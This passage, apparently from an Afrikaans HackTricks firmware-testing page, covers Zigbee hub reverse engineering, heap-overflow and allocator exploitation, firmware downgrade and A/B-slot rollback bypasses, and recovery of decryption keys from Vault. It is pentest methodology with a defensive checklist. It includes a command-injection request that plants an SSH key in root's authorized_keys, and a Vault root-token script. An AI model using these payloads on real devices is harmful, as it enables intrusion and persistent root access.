target remote <device-ip>:1234
```

### Zigbee / radio-co-processor-boodskapkartering

Op IoT-hubs word die RF-stack dikwels tussen ’n **radio-MCU** en ’n Linux-userland-proses verdeel. ’n Nuttige werkvloei is om die pad te karteer:<sup>[[8]](#references)</sup>

1. **RF-raam** oor die lug
2. **Ontleder aan die controller-kant** op die radio-MCU
3. **Seriële/UART-teks- of TLV-protokol** wat na Linux aangestuur word (byvoorbeeld `/dev/tty*`)
4. **Toepassingsdispatcher** in die hoofdaemon
5. **Protokolspesifieke handler / toestandsmasjien**

Hierdie argitektuur skep twee teikens vir reverse engineering in plaas van een. As die controller binêre radio-rame in ’n teksprotokol soos `Group,Command,arg1,arg2,...` omskakel, herstel:

- Die **boodskapgroepe** en dispatch-tabelle
- Watter boodskappe van die **netwerk** kan kom en watter van die controller self
- Die presiese **vervaardigerspesifieke diskrimineerdervelde** (byvoorbeeld Zigbee `manufacturer_code` en pasgemaakte `cluster_command`)
- Watter handlers slegs bereikbaar is tydens **commissioning**, ontdekking of aflaaifases vir firmware/modelle

Vir Zigbee, vang spesifiek paringsverkeer vas en kyk of die teiken steeds op die verstek-**Link Key** `ZigBeeAlliance09` staatmaak. Indien wel, kan die afluistering van commissioning-verkeer die **Network Key** blootlê. Zigbee 3.0-installasiekodes verminder hierdie blootstelling; let dus op of die getoetste toestel dit werklik afdwing.

### Vervaardigerspesifieke protokolhandlers en FSM-beheerde bereikbaarheid

Vervaardigerspesifieke Zigbee/ZCL-opdragte is dikwels ’n beter teiken as gestandaardiseerde clusters, omdat hulle **pasgemaakte ontledingskode** en interne **FSM’e** voed met minder beproefde validering.<sup>[[8]](#references)</sup>

Praktiese werkvloei:

- Reverse-engineer die opdragdispatcher totdat jy die **slegs vir die vervaardiger bedoelde handler** vind.
- Herstel die tabelle vir **FSM-toestand**, **gebeurtenis**, **kontrole**, **aksie** en **volgende toestand**.
- Identifiseer **oorgangstoestande** wat outomaties voortgaan, asook hertoevoer-/foutvertakkings wat uiteindelik aanvallerbeheerde toestand terugstel of vrystel.
- Bevestig watter wettige protokoluitruilings nodig is om die daemon in die kwesbare toestand te plaas, eerder as om aan te neem dat die foutiewe handler altyd bereikbaar is.

Vir tydsensitiewe protokolle kan pakketterugspeel vanuit ’n Python-raamwerk te stadig wees. ’n Betroubaarder benadering is om ’n wettige toestel op werklike hardeware (byvoorbeeld ’n **nRF52840**) met ’n vervaardigervlak-stack na te boots, sodat jy die korrekte **eindpunte**, **kenmerke** en commissioning-tydsberekening kan blootstel.

### Foutklas vir gefragmenteerde aflaaie in ingebedde daemons

’n Herhalende firmware-foutklas kom voor in **aflaaie van gefragmenteerde blobs/modelle/konfigurasies**:<sup>[[8]](#references)</sup>

1. Die **eerste fragment** (`offset == 0`) stoor `ctx->total_size` en ken `malloc(total_size)` toe.
2. Latere fragmente valideer slegs die aanvallerbeheerde **pakketplaaslike** velde, soos `packet_total_size >= offset + chunk_len`.
3. Die kopie gebruik `memcpy(&ctx->buffer[offset], chunk, chunk_len)` sonder om teen die **oorspronklike toegekende grootte** te kontroleer.

Dit laat ’n aanvaller toe om:

- ’n Eerste geldige fragment met ’n **klein** verklaarde totale grootte te stuur om ’n klein heap-toekenning af te dwing.
- ’n Latere fragment met die **verwagte offset**, maar ’n groter `chunk_len`, te stuur.
- ’n vervalste pakketplaaslike grootte te stuur wat aan die nuwe kontroles voldoen, maar steeds die buffer wat oorspronklik toegewys is, oorloop.

Wanneer die kwesbare pad agter commissioning-logika sit, moet die uitbuiting genoeg **toestelnabootsing** insluit om die teiken in die verwagte modelaflaai- of blobaflaaitoestand te kry voordat die misvormde fragmente gestuur word.

### Protokolgedrewe `free()`-snellers

In ingebedde daemons is die maklikste manier om heap-metadata-uitbuiting te aktiveer dikwels nie “wag vir opruiming” nie, maar om **die protokol se eie fouthantering af te dwing**:<sup>[[8]](#references)</sup>

- Stuur misvormde opvolgfragmente om die FSM na **hertoevoer-** of **fouttoestande** te stuur.
- Oorskry die hertoevoerlimiet sodat die daemon **konteks terugstel** en die beskadigde buffer vrystel.
- Gebruik hierdie voorspelbare `free()` om allocator-kant-primitiewe te aktiveer voordat die proses om onverwante redes ineenstort.

Dit is veral nuttig teen **musl/uClibc/dlmalloc-agtige** allocators in ingebedde Linux, waar die beskadiging van chunk-metadata unlink/unbin-logika in ’n skryfprimitief kan omskep. ’n Stabiele patroon is om ’n **grootteveld** te beskadig om allocatordeurloop na **vals chunks wat binne die oorloopte buffer geplaas is** te herlei, eerder as om werklike bin-wysers onmiddellik te beskadig en die proses te laat ineenstort.

## Binêre uitbuiting en Proof-of-Concept

Die ontwikkeling van ’n PoC vir geïdentifiseerde kwesbaarhede vereis ’n deeglike begrip van die teikenargitektuur en programmering in laevlaktale. Binêre looptydbeskermings is skaars in ingebedde stelsels, maar wanneer hulle teenwoordig is, kan tegnieke soos Return Oriented Programming (ROP) nodig wees.

### uClibc-fastbin-uitbuitingsnotas (ingebedde Linux)

- **Fastbins + konsolidering:** uClibc gebruik fastbins soortgelyk aan glibc. ’n Latere groot toekenning kan `__malloc_consolidate()` aktiveer, dus moet enige vals chunk kontroles slaag (geldige grootte, `fd = 0`, en aangrensende chunks wat as “in gebruik” beskou word).<sup>[[6]](#references)</sup>
- **Nie-PIE-binêre lêers onder ASLR:** as ASLR geaktiveer is, maar die hoofbinêre lêer **nie-PIE** is, is `.data/.bss`-adresse binne die binêre lêer stabiel. Jy kan ’n streek teiken wat reeds soos ’n geldige heap-chunk-kop lyk om ’n fastbin-toekenning op ’n **funksiewysertabel** te laat beland.
- **NUL wat die ontleder laat stop:** wanneer JSON ontleed word, kan ’n `\x00` in die loonvrag die ontleding stop terwyl daaropvolgende aanvallerbeheerde grepe behoue bly vir ’n stapelspil/ROP-ketting.
- **Shellcode via `/proc/self/mem`:** ’n ROP-ketting wat `open("/proc/self/mem")`, `lseek()` en `write()` aanroep, kan uitvoerbare shellcode in ’n bekende geheuekartering plaas en daarnaar spring.

## Voorbereide bedryfstelsels vir firmware-ontleding

Bedryfstelsels soos [AttifyOS](https://github.com/adi0x90/attifyos) en [EmbedOS](https://github.com/scriptingxss/EmbedOS) bied vooraf opgestelde omgewings vir firmware-sekuriteitstoetsing, toegerus met die nodige nutsgoed.

## Voorbereide OS’e vir firmware-ontleding

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS is ’n distro wat bedoel is om jou te help met sekuriteitsassessering en penetrasietoetsing van Internet of Things (IoT)-toestelle. Dit spaar jou baie tyd deur ’n vooraf opgestelde omgewing met al die nodige nutsgoed te bied.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): ’n Bedryfstelsel vir ingebedde sekuriteitstoetsing, gebaseer op Ubuntu 18.04 en vooraf gelaai met nutsgoed vir firmware-sekuriteitstoetsing.

## Firmware-afgraderingsaanvalle en onveilige opdateringsmeganismes

Selfs wanneer ’n vervaardiger kriptografiese handtekeningkontroles vir firmwarebeelde implementeer, word **weergawe-terugrolbeskerming (afgraderingsbeskerming)** dikwels weggelaat. Wanneer die selflaai- of herstel-laaier slegs die handtekening met ’n ingebedde publieke sleutel verifieer, maar nie die *weergawe* (of ’n monotoniese teller) van die beeld wat geflits word, vergelyk nie, kan ’n aanvaller wettiglik ’n **ouer, kwesbare firmware met ’n steeds geldige handtekening** installeer en sodoende reggestelde kwesbaarhede weer invoer.<sup>[[4]](#references)</sup>

Tipiese aanvalswerkvloei:

1. **Verkry ’n ouer beeld met ’n geldige handtekening**
   * Kry dit van die vervaardiger se openbare aflaaipoortaal, CDN of ondersteuningswebwerf.
   * Onttrek dit uit metgesel-mobiele-/rekenaartoepassings (bv. binne ’n Android APK onder `assets/firmware/`).
   * Kry dit van derdeparty-bewaarplekke soos VirusTotal, internetargiewe, forums, ens.
2. **Laai die beeld op na, of bedien dit aan, die toestel** via enige beskikbare opdateringskanaal:
   * Web-UI, mobiele-toepassing-API, USB, TFTP, MQTT, ens.
   * Baie IoT-toestelle vir verbruikers bied *ongeverifieerde* HTTP(S)-eindpunte wat Base64-geënkodeerde firmwareblobs aanvaar, dit aan die bedienerkant dekodeer en herstel/opgradering aktiveer.
3. Nadat die firmware afgegradeer is, buit ’n kwesbaarheid uit wat in die nuwer weergawe reggestel is (byvoorbeeld ’n opdraginspuitingsfilter wat later bygevoeg is).
4. Flits opsioneel die nuutste beeld terug of deaktiveer opdaterings om opsporing te vermy sodra volharding verkry is.

### Voorbeeld: Opdraginspuiting ná afgradering

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

In die kwesbare (afgegradeerde) firmware word die `md5`-parameter direk sonder sanitisering by ’n shell-opdrag gevoeg, wat inspuiting van arbitrêre opdragte moontlik maak (hier – om SSH-sleutelgebaseerde worteltoegang te aktiveer). Latere firmwareweergawes het ’n basiese karakterfilter ingestel, maar omdat afgraderingsbeskerming ontbreek, is die regstelling nutteloos.<sup>[[4]](#references)</sup>

### Onttrekking van firmware uit mobiele toepassings

Baie verskaffers bundel volledige firmwarebeelde in hul gepaardgaande mobiele toepassings, sodat die toepassing die toestel via Bluetooth/Wi-Fi kan bywerk. Hierdie pakkette word gewoonlik ongeënkripteer in die APK/APEX gestoor onder paaie soos `assets/fw/` of `res/raw/`. Gereedskap soos `apktool`, `ghidra` of selfs gewone `unzip` laat jou toe om ondertekende beelde te onttrek sonder om aan die fisiese hardeware te raak.<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### Omseiling van anti-rollback wat net in die updater-logika van A/B-slotontwerpe toegepas word

Sommige verskaffers implementeer wel ’n anti-downgrade-**ratchet**, maar slegs binne die *updater*-logika (byvoorbeeld ’n UDS-roetine oor CAN, ’n recovery-opdrag of ’n userspace OTA-agent). As die **bootloader** later net die image se handtekening/CRC nagaan en die partisie-tabel of slotmetadata vertrou, kan rollback-beskerming steeds omseil word.<sup>[[7]](#references)</sup>

Tipiese swak ontwerp:

- Firmware-metadata bevat beide ’n weergawebeskrywer en ’n **security ratchet** / monotone teller.
- Die updater vergelyk die image se ratchet met ’n waarde wat in aanhoudende berging gestoor is en verwerp ouer ondertekende images.
- Die bootloader **ontleed nie** daardie ratchet nie en verifieer net die kopstuk, CRC en handtekening voordat dit die geselekteerde slot selflaai.
- Slotaktivering word afsonderlik in ’n partisie-tabel of per-slot-generasieteller gestoor en is **nie kriptografies gekoppel** aan die presiese firmware-digest wat gevalideer is nie.

Dit skep ’n **validate-one-image / boot-another-image**-primitief in dubbel-slotstelsels. As die aanvaller die updater slot B as die volgende selflaaiteiken kan laat merk deur ’n huidige, ondertekende image te gebruik, en later slot B kan oorskryf voordat daar herbegin word, kan die bootloader steeds die afgegradeerde image selflaai omdat dit net die reeds vasgelegde slotmetadata vertrou.

Algemene misbruikpatroon:

1. Laai ’n **huidige, ondertekende** firmware na die passiewe slot op en voer die gewone validerings-/skakelroetine uit sodat die uitleg daardie slot as die volgende aktiewe slot merk.
2. **Moenie nog herbegin nie**. Voer die slotvoorbereidings-/uitveeroetine weer in dieselfde sessie uit.
3. Misbruik verouderde selflaaitoestand- of slotkeurlogika sodat die updater **dieselfde fisiese slot** uitvee wat pas bevorder is.
4. Skryf ’n **ouer maar steeds ondertekende** firmware na daardie slot.
5. Slaan die valideringsroetine wat die ratchet afdwing oor en herbegin direk.
6. Die bootloader kies die bevorderde slot, verifieer net die handtekening/integriteit en selflaai die ou image.

Dinge waarna jy moet oplet wanneer jy A/B-opdateringsimplementasies reverse-engineer:

- Slotkeuse wat afgelei word van **selflaaitydvlae** wat nie ná ’n suksesvolle skakeling verfris word nie.
- ’n `prepare_passive_slot()`-agtige roetine wat ’n slot uitvee op grond van verouderde toestand in plaas van die **huidige vasgelegde uitleg**.
- ’n `part_write_layout()`-agtige funksie wat net ’n **generasieteller** / aktiewe vlag verhoog en nie die gevalideerde image-hash stoor nie.
- Ratchet-kontroles wat in userspace- of updater-kode geïmplementeer is, maar **nie** in ROM-, bootloader- of secure-boot-stadia nie.
- Uitvee- of recovery-roetines wat die slot as selflaaibaar gemerk laat, selfs nadat die inhoud daarvan verwyder en herskryf is.

### Kontrolelys vir die beoordeling van opdateringslogika

* Is die vervoer/verifikasie van die *update-endpoint* voldoende beskerm (TLS + verifikasie)?
* Vergelyk die toestel **weergawenommers** of ’n **monotone anti-rollback-teller** voordat dit flits?
* Word die image binne ’n secure-boot-ketting geverifieer (bv. handtekeninge wat deur ROM-kode nagegaan word)?
* Dwing die **bootloader dieselfde ratchet as die updater af**, in plaas daarvan om net die handtekening/CRC na te gaan?
* Is slotaktiveringsmetadata **gekoppel aan die gevalideerde firmware-digest/-weergawe**, of kan ’n slot ná bevordering gewysig word?
* Word die toestel gedwing om te herbegin nadat ’n slotskakeling slaag, of bly latere opdaterings-/uitveerroetines in dieselfde sessie bereikbaar?
* Voer userland-kode bykomende gesondeverstandkontroles uit (bv. toegelate partisiekartering, modelnommer)?
* Hergebruik *gedeeltelike* of *rugsteun*-opdateringsvloeie dieselfde valideringslogika?

> 💡  As enige van die bogenoemde ontbreek, is die platform waarskynlik kwesbaar vir rollback-aanvalle.

## Kwesbare firmware om mee te oefen

Om te oefen om kwesbaarhede in firmware te ontdek, gebruik die volgende kwesbare firmwareprojekte as ’n beginpunt.

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Herwinning van firmware-dekripsiesleutels uit ingebedde KMS/Vault-toestand

Wanneer ’n opdateringsimage klein plaintext-metadata met ’n groot blob met hoë entropie meng, doen houer-triage voordat jy enigiets brute-force:<sup>[[1]](#references)</sup>

- Stort kopstukke, offsets en reëlgrense met `hexdump`, `xxd`, `strings -tx`, `base64 -d` en `binwalk -E`.
- `Salted__` beteken gewoonlik OpenSSL `enc`-formaat: die volgende 8 grepe is die salt en die oorblywende grepe is ciphertext.
- ’n Base64-veld wat na presies `256` grepe dekodeer, is ’n sterk aanduiding dat jy na ’n RSA-2048-ciphertext kyk wat ’n ewekansige firmware-wagwoord/sessiesleutel omhul.
- Losstaande PGP-materiaal in dieselfde lêer beskerm dikwels net egtheid; moenie aanvaar dat dit die vertroulikheidsmeganisme is nie.

As statiese sleuteljag (`grep`, `strings`, PEM/PGP-soektogte) misluk, reverse-engineer eerder die **operasionele dekripsiepad** as om net na private sleutels te soek:

- Decompileer die updater-/bestuursbinary en volg wie die geënkripteerde blob lees, watter helper/API dit ontseël, en watter logiese sleutelnaam dit versoek.
- Soek in die onttrekte root-lêerstelsel na KMS-toestand (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`), asook eenheidlêers en init-skripte.
- Behandel plaintext `vault operator unseal ...`, recovery-sleutels, bootstrap-tokens of plaaslike KMS outo-ontseëlskripte as gelykstaande aan privatesleutelmateriaal.

As die toestel die oorspronklike Vault-binary en berging-backend insluit, is dit gewoonlik makliker om daardie omgewing te herspeel as om Vault-internals te herimplementeer:

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

Met root op die gekloonde KMS:

- Maak transit-sleutels slegs binne die geïsoleerde kloon uitvoerbaar: `vault write transit/keys/<name>/config exportable=true`
- Voer die unwrap-sleutel uit: `vault read transit/export/encryption-key/<name>`
- Probeer die herstelde RSA-sleutel met die presiese padding/hash-paar wat deur die KMS gebruik word. ’n Mislukte PKCS#1 v1.5-dekripsie en ’n mislukte verstek-OAEP-dekripsie bewys **nie** dat die sleutel verkeerd is nie; baie Vault-gesteunde vloeie gebruik OAEP met SHA-256, terwyl algemene biblioteke SHA-1 as verstek gebruik.
- As die payload met `Salted__` begin, reproduseer die verskaffer se OpenSSL-KDF presies (`EVP_BytesToKey`, dikwels MD5 op ouer toestelle) voordat jy AES-CBC-dekripsie probeer.

Dit verander "geënkripteerde firmware" in ’n meer algemene probleem: **herstel die toestel se operasionele sleutels en reproduseer dan die presiese unwrap- en KDF-parameters vanlyn**.

## Opleiding en Sertifisering

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Kraak firmware met Claude: Vaardigheid op seniorvlak, outonomie op juniorvlak](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Metodologie vir firmware-sekuriteitstoetsing](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Praktiese IoT-hacking: Die definitiewe gids tot die aanval op die Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Uitbuiting van zero days in verlate hardeware – Trail of Bits-blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [Hoe ’n slimtoestel van $20 my toegang tot jou huis gegee het](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Nou sien jy my: nou is jy Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - Uitbuiting van die Tesla Wall Connector via sy laaipoortverbinding - Deel 2: omseiling van die anti-downgrade](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Laat dit flikker: Oor-die-lug-uitbuiting van die Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
- [9] [ROOT Tesla OS op QEMU Deel 1: Uitpak](https://cn0xroot.wordpress.com/2026/09/19/root-tesla-os-on-qemu-part-1-unpacking)
- [10] [Linux-kerneldokumentasie - dm-linear](https://docs.kernel.org/admin-guide/device-mapper/linear.html)
- [11] [ROOT Tesla OS op QEMU Deel 2: Ontfouting en regstelling](https://cn0xroot.wordpress.com/2026/09/20/root_tesla_os_on_qemu_part_2_debugging_fixing)
- [12] [Dell BIOS-wagwoorde: Swak XOR-enkripsie maak herstel vanaf SPI Flash moontlik (CVE-2026-40639)](https://mdsec.co.uk/2026/07/dell-bios-passwords-weak-xor-encryption-allows-recovery-from-spi-flash-cve-2026-40639)
- [13] [R3n5k1/dellpwn - Gereedskap vir die herstel van Dell BIOS-wagwoorde](https://github.com/R3n5k1/dellpwn)
{{#include ../../banners/hacktricks-training.md}}
